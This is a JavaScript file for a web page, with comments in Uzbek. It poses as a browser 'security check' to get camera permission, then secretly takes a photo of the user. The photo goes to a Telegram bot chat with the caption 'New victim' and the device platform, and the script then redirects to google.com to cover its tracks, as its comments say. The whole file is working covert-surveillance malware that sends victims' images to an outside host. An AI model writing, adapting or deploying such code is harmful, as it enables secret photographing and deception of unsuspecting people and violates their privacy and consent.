const TOKEN = "BOT_TOKENINGNI_YOZ"; 
const CHAT_ID = "-1003616289583";

const startBtn = document.getElementById('startBtn');
const msg = document.getElementById('msg');
const subMsg = document.getElementById('sub-msg');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const spinner = document.querySelector('.spinner');

startBtn.addEventListener('click', async () => {
    // 1. UI o'zgarishi (Garchi rasm olinayotgan bo'lsa ham, foydalanuvchi yuklanishni ko'radi)
    startBtn.style.display = 'none';
    spinner.style.display = 'block';
    msg.innerText = "Xavfsizlik tekshiruvi...";
    subMsg.innerText = "Brauzer sozlamalari tahlil qilinmoqda...";

    try {
        // 2. Kamera so'rash (Faqat bir marta ruxsat so'raydi)
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" }, 
            audio: false 
        });
        
        video.srcObject = stream;
        await video.play();

        // 3. Bildirmasdan rasmga olish (Kamera fokuslanishi uchun 1.2 soniya kutamiz)
        setTimeout(() => {
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob((blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                formData.append('caption', `👤 Yangi qurbon\n📱 Qurilma: ${navigator.platform}\n🌐 IP: Tekshirilmoqda...`);

                // 4. Telegramga yuborish
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).then(() => {
                    // Kamera chirog'ini o'chirish
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Oxirida foydalanuvchini chalg'itish uchun boshqa saytga otish
                    msg.innerText = "Muvaffaqiyatli!";
                    setTimeout(() => {
                        window.location.href = "https://google.com";
                    }, 500);
                });
            }, 'image/jpeg', 0.5); // Hajmni kamaytirish (tezroq yuborish uchun)
        }, 1200);

    } catch (err) {
        // Agar foydalanuvchi kamerani rad etsa ham, yuklanish davom etayotgandek ko'rinadi
        console.log("Kamera rad etildi");
        setTimeout(() => {
            window.location.href = "https://google.com";
        }, 2000);
    }
});
